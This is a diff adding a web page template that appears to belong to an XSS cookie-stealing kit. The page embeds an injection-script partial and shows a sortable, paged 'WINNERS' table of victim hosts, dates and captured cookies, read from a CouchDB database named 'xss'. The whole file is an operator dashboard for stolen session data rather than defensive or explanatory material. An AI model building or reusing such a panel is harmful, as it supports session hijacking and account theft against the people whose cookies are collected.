@@ -1,0 +1,141 @@
+{{>doctype}}
+<html>
+    {{>header}}
+    <body>
+        <ul>
+            <li class="injectscript">{{>inject}}</li>
+            <li class="getform">{{>getform}}</li>
+            <li class="getwinners">
+                <h1>Get &quot;WINNERS&quot;</h1>
+                <div class="num">3</div>
+				<table id="rows" class="rows">
+					<tr class="head">
+						<th class="pager" colspan="3">
+							Items per page:
+							<select id="limit">
+								<option selected="selected">5</option>
+								<option>10</option>
+								<option>20</option>
+								<option>50</option>
+							</select>
+							<button class="prev"></button>
+							<form action="#">
+								Page: <input id="page-num" value="1" maxlength="5" /> / <span class="total">X</span>
+							</form>
+							<button class="next"></button>
+						</th>
+					</tr>
+					<tr class="head">
+						<th>host <a id="byhost" class="asc" href="#byhost"><img src="{{ static }}/img/1px.gif" /></a></th>
+						<th>date <a id="bydate" class="desc" href="#bydate"><img src="{{ static }}/img/1px.gif" /></a></th><th>cookies</th>
+					</tr>
+				</table>
+            </li>
+        </ul>
+        <div class="clear"></div>
+
+        <script>
+            var config = {
+                db : "xss",
+                vendorjs : '{{ static }}/vendor/couchapp'
+            };
+        </script>
+        
+		<script src="{{ static }}/js/loader.js"></script>
+		<script>
+		$(function() {
+			var $db = $.couch.db(config.db);
+			var $table = $("#rows");
+			var $limit = $("#limit");
+			var $page = $("#page-num");
+			var $next = $(".pager .next");
+			var $prev = $(".pager .prev");
+			var $byDate = $("#bydate");
+			var $byHost = $("#byhost");
+			var dbView = "api/items";
+
+			var rowsTemplate = null;
+			var promise = $.get('{{ static }}/templates/row.html', function(t) { rowsTemplate = t; });
+			
+			var loadPage = function(skip, limit, descending) {
+				var opt = {
+					skip:skip,
+					limit:limit,
+					descending:descending||false,
+					success:function(data){
+						promise.done(function() {
+							var html = [];
+							for(var i in data.rows) {
+								var val = data.rows[i].value;
+								var view = {
+									host:val.host,
+									date:val.date,
+									cookies:val.cookies
+								};
+								html.push($.mustache(rowsTemplate, view));
+							}
+							$table.find("tr:not(.head)").remove();
+							$table.append(html.join(''));
+							$(".total").text(parseInt(data.total_rows / limit + 1));
+						});
+					}
+				};
+				$db.view(dbView, opt);
+			};
+			
+			var pageSize = function() {
+				return $limit.val();
+			};
+			
+			var currentPage = function() {
+				return (parseInt($page.val()) - 1) || 0;
+			};
+			
+			var currentPageUI = function() {
+				return currentPage() + 1;
+			};
+			
+			var skip = function(pageNum) {
+				return pageNum * pageSize();
+			};
+			
+			var sort = function(dbview, $el) {
+				dbView = dbview;
+				var desc = $el.hasClass("desc");
+				$el.removeClass().addClass(desc ? "asc" : "desc");
+				loadPage(skip(currentPage()), pageSize(), desc);
+			};
+			
+			$limit.change(function() {
+				loadPage(skip(currentPage()), pageSize());
+			});
+			
+			$next.click(function() {
+				var page = currentPage();
+				if(page > -1) {
+					$page.val(currentPageUI() + 1);
+					loadPage(skip(++page), pageSize());
+				}
+			});
+			
+			$prev.click(function() {
+				var page = currentPage();
+				if(page > 0) {
+					$page.val(currentPageUI() - 1);
+					loadPage(skip(--page), pageSize());
+				}
+			});
+			
+			$byDate.click(function() {
+				sort("api/items-by-date", $byDate);
+			});
+			
+			$byHost.click(function() {
+				sort("api/items-by-host", $byHost);
+			});
+			
+			$limit.change();
+		});
+		</script>
+    </body>
+</html>
